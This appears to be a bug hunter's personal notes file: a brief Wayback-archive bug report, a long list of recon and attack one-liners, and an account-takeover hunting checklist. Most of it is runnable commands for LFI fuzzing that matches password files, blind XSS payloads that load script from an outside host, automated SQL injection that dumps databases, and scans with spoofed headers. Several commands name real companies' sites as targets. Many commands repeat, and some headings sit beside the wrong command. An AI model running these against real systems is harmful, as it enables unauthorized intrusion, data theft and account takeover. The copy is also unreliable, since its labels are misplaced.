## Advanced Recon Methodology
Inaccessible Files via Direct URL Show 404 Error but Can Be Retrieved from Web Archive

Bug Description:
While using waybackurls to enumerate URLs from a specific site, I discovered numerous .zip, .pdf, and .xls files. However, when attempting to access these files via their direct URLs, they consistently returned a 404 Not Found error. To further investigate, I accessed the URLs through the Web Archive and successfully retrieved the files by selecting earlier snapshots of the site. This indicates that the files, although no longer available directly, exist in archived versions of the site.

Steps to Reproduce:
1.  Use waybackurls to extract URLs from the target site.
2.  Identify URLs for .zip, .pdf, or .xls files.
3.  Attempt to access the files through their direct URLs in a browser or using a tool like curl. Observe the 404 Not Found error.
4.  Navigate to Web Archive.
5.  Enter the inaccessible URL in the search bar.
6.  Select an older snapshot of the URL.
7.  Download the file successfully from the archive.

Direct URLs return a 404 Not Found error, but files are retrievable from older snapshots in the Web Archive.
Impact:
Users are unable to access potentially critical resources through their original URLs. This could lead to user frustration, loss of trust, and inefficiency in retrieving historical data.

Attachments:
•  Example URLs showing the issue.
•  Screenshots of the 404 error.
•  Screenshots of successful downloads from Web Archive.
Please address this issue to improve user experience and ensure data accessibility.
Removing content from the Wayback Machine (Web Archive) involves specific steps, as the archive is designed to preserve web content for public access. Website owners or authorized parties can request removal if they have a valid reason, such as sensitive or outdated information, copyright issues, or legal compliance. Below are the details on how this can be done:
____
Steps to Remove Content from the Wayback Machine
1. Contact Internet Archive Directly
•  Website owners can submit a request to the Internet Archive to remove specific pages or files. This is typically done via email to their designated support team:
Email: info@archive.org
•  Include the following details in your request:
o  The exact URL(s) to be removed.
o  The reason for the removal (e.g., copyright infringement, sensitive content, outdated information).
o  Proof of ownership of the website (e.g., ability to edit DNS records, email correspondence from the domain).
2. Use the robots.txt File
•  Update the website's robots.txt file to disallow the Internet Archive’s crawler from archiving the site or specific pages.
•  Example:
User-agent: ia_archiver
Disallow: /
•  Once this is done, notify the Internet Archive that you’ve updated the robots.txt file and request the removal of existing snapshots. They respect robots.txt directives.
3. Legal Takedown Notice
•  If the content violates laws or copyrights, a DMCA takedown notice or similar legal notice can be submitted to the Internet Archive.
•  Provide all relevant legal documentation and details about the infringement to strengthen your case.
4. Check Host-Level Restrictions
•  If the content was hosted by a third-party provider, request that the hosting provider also take steps to block or remove access from their end.
____
Mitigation if Removal is Not Possible
1.  Redirect to Updated Content:
Ensure users landing on outdated links are redirected to a current version or alternative content.
2.  Proactive Management:
Regularly monitor and manage outdated or sensitive content to prevent unnecessary archiving in the future.
____
Important Notes
•  Only website owners or authorized parties can request content removal.
•  Internet Archive may deny requests that do not meet their policies or involve public interest material.

## LostSec🤯
```
subfinder -d example.com -all -recursive > subdomain.txt
```

For finding subdomains
```
cat subdomain.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt
```

For filter out live subdomains
```
katana -u subdomains_alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt
```
For fetching passive urls
```
cat allurls.txt | grep -E '\.xls|\.xml|\.xlsx|\.json|\.pdf|\.sql|\.doc|\.docx|\.pptx|\.txt|\.zip|\.tar\.gz|\.tgz|\.bak|\.7z|\.rar|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.gz|\.config|\.csv|\.yaml|\.md|\.md5'
```
For finding sensitive files
```
echo example.com | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl | urldedupe >output.txt
```
For fetch and sorting urls - part 1
```
katana -u https://example.com -d 5 | grep '=' | urldedupe | anew output.txt
```
For fetch and sorting urls - part 2
```
cat output.txt | sed 's/=.*/=/' >final.txt
```
For fetch and sorting urls - part 3
```
echo example.com | gau --mc 200 | urldedupe >urls.txt
```
For fetch and sorting urls - part 4
```
cat urls.txt | grep -E '.php|.asp|.aspx|.jspx|.jsp' | grep '=' | sort > output.txt
```
For fetch and sorting urls - part 5
```
cat output.txt | sed 's/=.*/=/' >final.txt
```

For fetch and sorting urls - part 6
```
arjun -u https://site.com/endpoint.php -oT arjun_output.txt -t 10 --rate-limit 10 --passive -m GET,POST --headers 'User-Agent: Mozilla/5.0'
```
For finding hidden parameter - part 1
```
arjun -u https://site.com/endpoint.php -oT arjun_output.txt -m GET,POST -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -t 10 --rate-limit 10 --headers 'User-Agent: Mozilla/5.0'
```
For finding hidden parameter - part 2
```
curl -H 'Origin: http://example.com' -I https://etoropartners.com/wp-json/
```
For checking CORS - part 1
```
curl -H 'Origin: http://example.com' -I https://etoropartners.com/wp-json/ | grep -i -e 'access-control-allow-origin' -e 'access-control-allow-methods' -e 'access-control-allow-credentials'
```
For checking CORS - part 2
```
site:*.example.com (ext:doc OR ext:docx OR ext:odt OR ext:pdf OR ext:rtf OR ext:ppt OR ext:pptx OR ext:csv OR ext:xls OR ext:xlsx OR ext:txt OR ext:xml OR ext:json OR ext:zip OR ext:rar OR ext:md OR ext:log OR ext:bak OR ext:conf OR ext:sql)
```
Information Disclosure dork
```
wpscan --url https://site.com --disable-tls-checks --api-token <here> -e at -e ap -e u --enumerate ap --plugins-detection aggressive --force
```
Wordpress aggressive scanning
```
echo 'https://example.com/' | gau | gf lfi | uro | sed 's/=.*/=/' | qsreplace 'FUZZ' | sort -u | xargs -I{} ffuf -u {} -w payloads/lfi.txt -c -mr 'root:(x|\*|\$[^\:]*):0:0:' -v
```
LFI methodology
```
dirsearch -u https://example.com -e php,cgi,htm,html,shtm,shtml,js,txt,bak,zip,old,conf,log,pl,asp,aspx,jsp,sql,db,sqlite,mdb,tar,gz,7z,rar,json,xml,yml,yaml,ini,java,py,rb,php3,php4,php5 --random-agent --recursive -R 3 -t 20 --exclude-status=404 --follow-redirects --delay=0.1
```
Directory Bruteforce - part 1
```
ffuf -w seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u https://example.com/FUZZ -fc 400,401,402,403,404,429,500,501,502,503 -recursion -recursion-depth 2 -e .html,.php,.txt,.pdf,.js,.css,.zip,.bak,.old,.log,.json,.xml,.config,.env,.asp,.aspx,.jsp,.gz,.tar,.sql,.db -ac -c -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'X-Forwarded-For: 127.0.0.1' -H 'X-Originating-IP: 127.0.0.1' -H 'X-Forwarded-Host: localhost' -t 100 -r -o results.json
```
Directory Bruteforce - part 2
```
echo example.com | katana -d 5 | grep -E '\.js$' | nuclei -t nuclei-templates/http/exposures/ -c 30
```

JS File hunting - part 1
```
cat alljs.txt | nuclei -t /home/coffinxp/nuclei-templates/http/exposures/
```
JS File hunting - part 2
```
subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl
```
For Checking Subdomain takeover
```
python3 corsy.py -i subdomains_alive.txt -t 10 --headers 'User-Agent: GoogleBot\nCookie: SESSION=Hacked'
```
For finding CORS
```
subfinder -d example.com | gau | bxss -payload ''><script src=https://xss.report/c/coffinxp></script>' -header 'X-Forwarded-For'
```
For testing header based blind xss
```
echo 'example.com ' | gau | qsreplace '<sCript>confirm(1)</sCript>' | xsschecker -match '<sCript>confirm(1)</sCript>' -vuln
```
For checking single xss on all urls
```
subfinder -d example.com | gau | grep '&' | bxss -appendMode -payload ''><script src=https://xss.report/c/coffinxp></script>' -parameters
```
For finding Blind xss
```
echo domain | gau | grep -Eo '(\/[^\/]+)\.(php|asp|aspx|jsp|jsf|cfm|pl|perl|cgi|htm|html)$' | httpx -status-code -mc 200 -content-type | grep -E 'text/html|application/xhtml+xml'
```
Content-type Filter - part 1
```
Ssl.cert.subject.CN:'example.com' 200
```
Shodan dork
```
echo https://example.com/ | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt
```
XSS method - part 1
```
cat xss_output.txt | grep -oP '^URL: \K\S+' | sed 's/=.*/=/' | sort -u > final.txt
```
XSS method - part 2
```
naabu -list ip.txt -c 50 -nmap-cli 'nmap -sV -SC' -o naabu-full.txt
```
Naabu scan
```
nmap -p- --min-rate 1000 -T4 -A target.com -oA fullscan
```
Nmap scan
```
masscan -p0-65535 target.com --rate 100000 -oG masscan-results.txt
```
Masscan
```
ffuf -request lfi -request-proto https -w /root/wordlists/offensive\ payloads/LFI\ payload.txt -c -mr 'root:'
```
FFUF request file method - part 1
```
ffuf -request xss -request-proto https -w /root/wordlists/xss-payloads.txt -c -mr '<script>alert('XSS')</script>'
```
FFUF request file method - part 2
```
cat domains.txt | assetfinder --subs-only| httprobe | while read url; do xss1=$(curl -s -L $url -H 'X-Forwarded-For: xss.yourburpcollabrotor'|grep xss) xss2=$(curl -s -L $url -H 'X-Forwarded-Host: xss.yourburpcollabrotor'|grep xss) xss3=$(curl -s -L $url -H 'Host: xss.yourburpcollabrotor'|grep xss) xss4=$(curl -s -L $url --request-target http://burpcollaborator/ --max-time 2); echo -e '\e[1;32m$url\e[0m''\n''Method[1] X-Forwarded-For: xss+ssrf => $xss1''\n''Method[2] X-Forwarded-Host: xss+ssrf ==> $xss2''\n''Method[3] Host: xss+ssrf ==> $xss3''\n''Method[4] GET http://xss.yourburpcollabrotor HTTP/1.1 ''\n';done
```
XSS and SSRF testing with headers
```
echo 'https://example.com/index.php?page=' | httpx-toolkit -paths payloads/lfi.txt -threads 50 -random-agent -mc 200 -mr 'root:(x|\*|\$[^\:]*):0:0:'
```
#SQRY Recon - Shodan ip scanner
```
go install github.com/Karthik-HR0/sqry@latest
```
```
sqry -q "apache" > apache_ips.txt # Search for apache servers

sqry -q 'org:\"Google LLC\"' # Search with organization filter

sqry -q "port:443" | sort -u # Search with port filter

sqry -q "apache" | xargs -I {} nmap -sV {} # Scan found IPs with nmap

sqry -q "apache" | tee ips.txt | wc -l # Save to file and count results

sqry -q "apache" | grep -v "^10\." > public_ips.txt # Filter and process results
```

```
subfinder -d ferrari.com -all -recursive > ferrari.txt
```

```
subfinder -d vulnweb.com -all -silent | gau -t 50 | uro | gf sqli > sql.txt; ghauri -m sql.txt --batch --dbs --level 3 --confirm 
```

```
echo "test.vulnweb.com" | gau -t 50 | uro | gf sqli > sql.txt; ghauri -m sql.txt --batch --dbs --level 3 --confirm
```

```
grep -Eo 'https?://[^ ]+' 200.txt > urls_only.txt
```

```
awk '{print $1}' 200.txt > urls_only.txt
```

```
cat ferrari.txt | httpx-toolkit -threads 200 | grep -I "200" > liveferrari.txt
```


```
katana -u out.txt -d 5 waybackarchive,commoncrawl,alienvault -kf -jc -fx -em xls,xml,xlsx,json,pdf,sql,doc,docx,pptx,txt,zip,tar,gz,tgz,bak.7z,rar,log,cache,secret,db,backup,yml,gz,config,csv,yaml,md,md5 >> allurls1.txt
```
```
katana -u out.txt -d 5 waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg >> allurls.txt
```

```
cat allurls.txt | grep -E '\.xls|\.xml|\.xlsx|\.json|\.pdf|\.sql|\.doc|\.docx|\.pptx|\.txt|\.zip|\.tar\.gz|\.tgz|\.bak|\.7z|\.rar|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.gz|\.config|\.csv|\.yaml|\.md|\.md5'
```

```
echo 172.217.14.228.com | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl | urldedupe > etsyoutput.txt
```

## For  fetch and sorting urls - part 1
```
katana -u https://etsy.com -d 5 | grep '=' | urldedupe | anew etsynew.txt
```
## For  fetch and sorting urls - part 2
```
cat etsynew.txt | sed 's/=.*/=/' >final.txt
```
## For  fetch and sorting urls - part 3
```
echo etsy.com | gau --mc 200 | urldedupe >> etsyurls.txt
```
# For  fetch and sorting urls - part 4
```
cat etsyurls.txt | grep -E '.php|.asp|.aspx|.jspx|.jsp' | grep '=' | sort > etsyoutput.txt
```
# For  fetch and sorting urls - part 5
```
cat etsyoutput.txt | sed 's/=.*/=/' > etsysedfinal.txt
```
# For  fetch and sorting urls - part 6
```
arjun -u https://site.com/endpoint.php -oT arjun_output.txt -t 10 --rate-limit 10 --passive -m GET,POST --headers 'User-Agent: Mozilla/5.0'
```
# For  finding hidden parameter - part 1
```
arjun -u https://site.com/endpoint.php -oT arjun_output.txt -m GET,POST -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -t 10 --rate-limit 10 --headers 'User-Agent: Mozilla/5.0'
```  
# For  finding hidden parameter - part 2
```
curl -H 'Origin: 172.217.14.228' -I https://etoropartners.com/wp-json/
```
# For  checking CORS - part 
```
curl -H 'Origin: https://172.217.14.228.com' -I https://www.google.com | grep -i -e 'access-control-allow-origin' -e 'access-control-allow-methods' -e 'access-control-allow-credentials'
```
# For  checking CORS DORK - part 2
```
site:*.etsy.com (ext:doc OR ext:docx OR ext:odt OR ext:pdf OR ext:rtf OR ext:ppt OR ext:pptx OR ext:csv OR ext:xls OR ext:xlsx OR ext:txt OR ext:xml OR ext:json OR ext:zip OR ext:rar OR ext:md OR ext:log OR ext:bak OR ext:conf OR ext:sql)
```
Information Disclosure dork
```
wpscan --url https://site.com --disable-tls-checks --api-token <here> -e at -e ap -e u --enumerate ap --plugins-detection aggressive --force
```
# Wordpress aggressive scanning
```
echo 'https://canva.com/' | gau | gf lfi | uro | sed 's/=.*/=/' | qsreplace 'FUZZ' | sort -u | xargs -I{} ffuf -u {} -w payloads/lfi.txt -c -mr 'root:(x|\*|\$[^\:]*):0:0:' -v
```
# LFI methodology
```
dirsearch.py -u https://www.indeed.com -e php,cgi,htm,html,shtm,shtml,js,txt,bak,zip,old,conf,log,pl,asp,aspx,jsp,sql,db,sqlite,mdb,tar,gz,7z,rar,json,xml,yml,yaml,ini,java,py,rb,php3,php4,php5 --random-agent --recursive -R 3 -t 20 --exclude-status=404 --follow-redirects --delay=0.1
```
# Directory Bruteforce - part 1
```
ffuf -w /Users/anom/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -u https://www.indeed.com/FUZZ -fc 400,401,402,403,404,429,500,501,502,503 -recursion -recursion-depth 2 -e .html,.php,.txt,.pdf,.js,.css,.zip,.bak,.old,.log,.json,.xml,.config,.env,.asp,.aspx,.jsp,.gz,.tar,.sql,.db -ac -c -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'X-Forwarded-For: 127.0.0.1' -H 'X-Originating-IP: 127.0.0.1' -H 'X-Forwarded-Host: localhost' -t 100 -r -o results.json
```
# Directory Bruteforce - part 2
```
echo ferrari.com | katana -d 5 | grep -E '\.js$' | nuclei -t /Users/anom/tools/Scripts/community-templates -c 30
```
# JS File hunting - part 1
```
cat alljs.txt | nuclei -t /home/coffinxp/nuclei-templates/http/exposures/
```
# JS File hunting - part 2
```
subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl
```
# For Checking Subdomain takeover
```
python3 corsy.py -i subdomains_alive.txt -t 10 --headers 'User-Agent: GoogleBot\nCookie: SESSION=Hacked'
```
# For finding CORS
```
subfinder -d example.com | gau | bxss -payload ''><script src=https://xss.report/c/coffinxp></script>' -header 'X-Forwarded-For'
```
# For testing header based blind xss
```
echo 'example.com ' | gau | qsreplace '<sCript>confirm(1)</sCript>' | xsschecker -match '<sCript>confirm(1)</sCript>' -vuln
```
# For checking single xss on all urls
```
subfinder -d example.com | gau | grep '&' | bxss -appendMode -payload ''><script src=https://xss.report/c/coffinxp></script>' -parameters
```
# For finding Blind xss
```
echo domain | gau | grep -Eo '(\/[^\/]+)\.(php|asp|aspx|jsp|jsf|cfm|pl|perl|cgi|htm|html)$' | httpx -status-code -mc 200 -content-type | grep -E 'text/html|application/xhtml+xml'
```
# Content-type Filter - part 1
```
Ssl.cert.subject.CN:'example.com' 200
```
# Shodan dork
```
echo https://example.com/ | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt
```
# XSS method - part 1
```
cat xss_output.txt | grep -oP '^URL: \K\S+' | sed 's/=.*/=/' | sort -u > final.txt
```
# XSS method - part 2
```
naabu -list ip.txt -c 50 -nmap-cli 'nmap -sV -SC' -o naabu-full.txt
```
# Naabu scan
```
nmap -p- --min-rate 1000 -T4 -A target.com -oA fullscan
```
# Nmap scan
```
masscan -p0-65535 target.com --rate 100000 -oG masscan-results.txt
```
# Masscan
```
ffuf -request lfi -request-proto https -w /root/wordlists/offensive\ payloads/LFI\ payload.txt -c -mr 'root:'
```
# FFUF request file method - part 1
```
ffuf -request xss -request-proto https -w /root/wordlists/xss-payloads.txt -c -mr '<script>alert('XSS')</script>'
```
# FFUF request file method - part 2
```
cat domains.txt | assetfinder --subs-only| httprobe | while read url; do xss1=$(curl -s -L $url -H 'X-Forwarded-For: xss.yourburpcollabrotor'|grep xss) xss2=$(curl -s -L $url -H 'X-Forwarded-Host: xss.yourburpcollabrotor'|grep xss) xss3=$(curl -s -L $url -H 'Host: xss.yourburpcollabrotor'|grep xss) xss4=$(curl -s -L $url --request-target http://burpcollaborator/ --max-time 2); echo -e '\e[1;32m$url\e[0m''\n''Method[1] X-Forwarded-For: xss+ssrf => $xss1''\n''Method[2] X-Forwarded-Host: xss+ssrf ==> $xss2''\n''Method[3] Host: xss+ssrf ==> $xss3''\n''Method[4] GET http://xss.yourburpcollabrotor HTTP/1.1 ''\n';done
```

# Try this amazingg LFI oneliner its veryfast and effective also change ffuf useragent so its dont get blocked by waf's
```
waymore -i "" -n -mode U | gf lfi | sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | while read urls; do ffuf -u $urls -w payloads/lfi.txt -c -mr "root:" -v; done
```
```
waymore -i "" -n -mode U | gf lfi | sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | tee testphp.vulnweb.com.lfi.txt
```
```
cat testphp.vulnweb.com.lfi.txt | while read urls; do ffuf -u $urls -w payloads/lfi.txt -c -mr "root:" -v; done
```
# XSS and SSRF testing with headers
```
echo 'https://example.com/index.php?page=' | httpx-toolkit -paths payloads/lfi.txt -threads 50 -random-agent -mc 200 -mr 'root:(x|\*|\$[^\:]*):0:0:'
```
# LFI methodology - alternative method

# Gather assets through API
```
https://www.virustotal.com/vtapi/v2/domain/report?apikey=<api_key>&domain=<DOMAIN>
```
```
curl -s "https://www.virustotal.com/vtapi/v2/domain/report?domain=<DOMAIN>&apikey=<api_key>" | jq -r '.. | .ip_address? // empty' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}'
```
```
curl -s "https://www.virustotal.com/vtapi/v2/domain/report?apikey=<api_key>&domain=<DOMAIN>" | jq -r '.domain_siblings[]'
```

```
curl -s "https://otx.alienvault.com/api/v1/indicators/hostname/<DOMAIN>/url_list?limit=500&page=1" | jq -r '.url_list[]?.result?.urlworker?.ip // empty' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}'
```
```
http.favicon.hash:1265477436
```
```
shodan search Ssl.cert.subject.CN:"<DOMAIN>" 200 --fields ip_str | httpx-toolkit -sc -title -server -td
```
```
nmap --script ssl-cert -p 443 <IP Address>
```
```
https://web.archive.org/cdx/search/cdx?url=<DOMAIN>&fl=original&collapse=urlkey
```
```
curl -s "https://urlscan.io/api/v1/search/?q=domain:<DOMAIN>&size=10000" | jq -r '.results[]?.page?.ip // empty' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}'
```
```
curl https://cvedb[.]shodan[.]io/cves | jq | grep "cve_id"
```

1. Pre-Account Takeover

- How to Hunt:

 - Register an email without verifying it.

 - Register again using a different method (e.g., 'sign up with Google') with the same email.

 - Check if the application links both accounts.

 - Try logging in to see if you can access information from the other account.

  

 2. Account Takeover due to Improper Rate Limiting

- How to Hunt:

 - Capture the login request.

 - Use tools like Burp Suite's Intruder to brute-force the login.

 - Analyze the response and length to detect anomalies.

  

 3. Account Takeover by Utilizing Sensitive Data Exposure

- How to Hunt:

 - Pay attention to the request and response parts of the application.

 - Look for exposed sensitive data like OTPs, hashes, or passwords.

  

 4. Login Vulnerabilities

- Check for:

 - Brute-force vulnerabilities.

 - OAuth misconfigurations.

 - OTP brute-forcing.

 - JWT misconfigurations.

 - SQL injection to bypass authentication.

 - Proper validation of OTP or tokens.

  

 5. Password Reset Vulnerabilities

- Check for:

 - Brute-force vulnerabilities in password reset OTPs.

 - Predictable tokens.

 - JWT misconfigurations.

 - IDOR vulnerabilities.

 - Host header injection.

 - Leaked tokens or OTPs in HTTP responses.

 - Proper validation of OTP or tokens.

 - HTTP parameter pollution (HPP).

  

 6. XSS to Account Takeover

- How to Hunt:

 - Try to exfiltrate cookies or auth tokens.

 - Craft XSS payloads to change user email or password.

  

 7. CSRF to Account Takeover

- Check for:

 - Vulnerabilities in email update endpoints.

 - Vulnerabilities in password change endpoints.

  

 8. IDOR to Account Takeover

- Check for:

  

 - Vulnerabilities in email update endpoints.

 - Vulnerabilities in password change endpoints.

 - Vulnerabilities in password reset endpoints.

  

9. Account Takeover by Response & Status Code Manipulation- How to Hunt:

  - Look for vulnerabilities where manipulating response or status codes can lead to account takeover.

  

10. Account Takeover by Exploiting Weak Cryptography- Check for:

  - Weak cryptographic implementations in password reset processes.

  

11. Password or Email Change Function- How to Hunt:

  - If you see email parameters in password change requests, try changing your email to the victim's email.

  

12. Sign-Up Function- How to Hunt:

  - Try signing up with the target email directly.  - Use third-party sign-ups with phone numbers, then link the victim's email to your account.

  

13. Rest Token

- How to Hunt:  - Try using your REST token with the target account.

  - Brute 13. Rest Token- How to Hunt:

  - Try using your REST token with the target account.  - Brute force the REST token if it is numeric.

  - Try to figure out how the tokens are generated. For example, check if they are generated based on timestamp, user ID, or email.

  

14. Host Header Injection- How to Hunt:

  - Intercept the REST account request.  - Change the Host header value from the target site to your own domain (e.g., `POST /PassRest HTTP/1.1 Host: Attacker.com`).

  

15. CORS Misconfiguration to Account Takeover

- How to Hunt:  - Check if the application has CORS misconfigurations.

  - If so, you might be able to steal sensitive information from the user to take over their account or make them change authentication information.  - Refer to [CORS Bypass](https://book.hacktricks.xyz/pentesting-web/cors-bypass) for more details.

  

16. Account Takeover via Leaked Session Cookie

- How to Hunt:  - Look for vulnerabilities where session cookies are leaked.

- Refer to [HackerOne Report 745324](https://hackerone.com/reports/745324) for more details.

  

17. HTTP Request Smuggling to ATO- How to Hunt:

  - Look for HTTP request smuggling vulnerabilities.

  - Refer to [HackerOne Reports 737140 and 740037](https://hackerone.com/reports/737140) and [HackerOne Report 740037](https://hackerone.com/reports/740037) for more details.

  

  

18. Bypassing Digits Origin Validation Which Leads to Account Takeover- How to Hunt:

  - Look for vulnerabilities where digits origin validation can be bypassed.  - Refer to [HackerOne Report 129873](https://hackerone.com/reports/129873) for more details.

  

19. Top ATO Reports in HackerOne

- How to Hunt:  - Review top account takeover reports in HackerOne.

  - Refer to [TOP ACCOUNT TAKEOVER](https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPACCOUNTTAKEOVER.md) for more details.


![[telegram-cloud-photo-size-5-6064406681816777009-y.jpg]]

